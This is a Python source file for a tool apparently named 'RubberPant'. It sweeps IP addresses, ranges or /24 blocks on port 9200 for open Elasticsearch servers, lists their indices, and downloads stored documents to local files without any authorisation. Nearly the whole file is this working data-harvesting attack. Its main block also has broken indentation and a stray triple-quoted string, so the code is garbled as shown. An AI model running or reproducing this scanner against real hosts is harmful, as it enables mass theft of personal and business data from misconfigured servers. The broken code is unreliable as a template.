import requests
import json
import sys
from progress.bar import Bar
import os, platform


os_env = platform.platform()
def clear_screen(os_env):
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')

def usage():
    print("Usage: {} [-ip IP_Address | -ipc IP_CIDR_Notataion | -ipr IP_RANGE[ -p port[default:9200]] | --shodan]".format(sys.argv[0]))


def _start():
    banner = '''

 ______      _     _              ______           _   
| ___ \    | |   | |             | ___ \         | |  
| |_/ _   _| |__ | |__   ___ _ __| |_/ __ _ _ __ | |_ 
|    | | | | '_ \| '_ \ / _ | '__|  __/ _` | '_ \| __|
| |\ | |_| | |_) | |_) |  __| |  | | | (_| | | | | |_ 
\_| \_\__,_|_.__/|_.__/ \___|_|  \_|  \__,_|_| |_|\__|
                                                      
                                                      
                        coded by: @mztique @eeyitemi
'''
    port = "9200"
    print(banner)
    try:
        if "-p" in sys.argv:
            p = sys.argv.index("-p")
            port = sys.argv[p+1]
            
        if "-ip" in sys.argv:
           ip = sys.argv.index("-ip")
           ip_address = sys.argv[ip+1]
           host = ip_address+":"+port
           elastic_rubber(host)
        elif "-ipr" in sys.argv:
            ipr = sys.argv.index("-ipr")
            ip_add_range = sys.argv[ipr+1]
            ip_range(ip_add_range,port)
        elif "-ipc" in sys.argv:
            ipc = sys.argv.index("-ipc")
            ip_address = sys.argv[ipc+1]
            cidr(ip_address,port)
        elif "--shodan" in sys.argv:
            print("Shodan search coming soon")
            exit(0)
            
    except Exception as ex:
        print("Exception caught: {}".format(ex))
        raise Exception
        usage()

  
def ip_range(ip,port):
    start, stop = ip.split("-")

    _start = start.split(".")
    _stop = stop.split(".")
    
    #Check same subnet
    if _start[2] == _stop[2]:
        start_host_index = int(_start[3])
        stop_host_index = int(_stop[3])
        counter = start_host_index
        while stop_host_index != counter-1:
            ip_address = _start[0]+"."+_start[1]+"."+_start[2]+"."+str(counter)
            host = ip_address+":"+port
            print("Cheking ===>  {}".format(host))
            elastic_rubber(host)
            counter = counter + 1
    
def cidr(ip,port):
    #TODO calcalate cidr notation
    ip,cidr = ip.split("/")
    if cidr == "24":
        start = ip.split(".")
        for i in range(255):
            ip_address = start[0]+"."+start[1]+"."+start[2]+"."+str(i)
            host = ip_address+":"+port
            print("Cheking ===>  {}".format(host))
            elastic_rubber(host) 
    else:
        print("Sorry only /24 notation supported")
        
            
                  
def elastic_rubber(host):
    try:
        #Check host
        elastic = requests.get("http://"+host)

        if elastic.status_code == 200:
            if "cluster_name" in elastic.text:
                elastic_host = json.loads(elastic.text)
                print('''
    Name:             {}
    Cluster Name:     {}
    Cluster UUID:     {}
    Elastic Version:  {}
    Lucene Version:   {}
    Build Date:       {}
    '''.format(
        elastic_host["name"],
        elastic_host["cluster_name"],
        elastic_host["cluster_uuid"],
        elastic_host["version"]["number"],
        elastic_host["version"]["lucene_version"],
        elastic_host["version"]["build_date"])
                      )
                
                
                index_cmd = "/_cat/indices/?v&pretty"
                indices = requests.get("http://"+host+index_cmd)
                print(indices.text)
        
                if "index" in indices.text:
                    index = input("What index do you wish to explore? ")
                    explore_index(host,index)
                else:
                    print("Sorry! Index not found. Ensure the name is written correctly")
                
            else:
                print("{}: Cluster name not found. Ensure it's an Elasticsearch instance".format(host))
    except Exception as ex:
        print("Error Occured! {}, please check and try again".format(ex))

def explore_index(host,index):
    
    _size = input("How many data set to explore? ")
    _from = input("Where to start downloading?[default:0] ")
    if not _from:
        _from = '0'
    print()
    explore_cmd = "/_search/?q=*&size="+_size+"&from="+_from

    re = requests.get("http://"+host+"/"+index+explore_cmd)
    data = json.loads(re.text)
    if int(data["hits"]["total"]) > 0:
        hits = data["hits"]["hits"]
        #_host = host.replace(".","_")
        _host = host.replace(":","-")
        filename = _host+'_'+index+'.txt'
        
        f = open(filename, 'a+')
        bar = Bar('Downloading', max=len(hits))
        for i in hits:
            source = dict(i)
            _source = source["_source"]
            f.writelines(json.dumps(_source, indent=4))
            
            bar.next()
        bar.finish()
        print("Results saved to: {}".format(filename))
        
    else:
        print("Nothing found, see below\n{}".format(data))


if __name__ == '__main__':
    clear_screen(os_env)
    if len(sys.argv) < 3:
        usage()
    else:
         _start()
        thread_list = []
        if "-t" in sys.argv:
            print("Thread support coming soon")
            '''
            t = sys.argv.index("-t")
            tr = sys.argv[t+1]
            for i in range(tr+1):
                tr = threading.Thread(target=_start)                            
                thread_list.append(tr)

            for thread in thread_list:
                thread.join()
        else:
            _start()
            '''
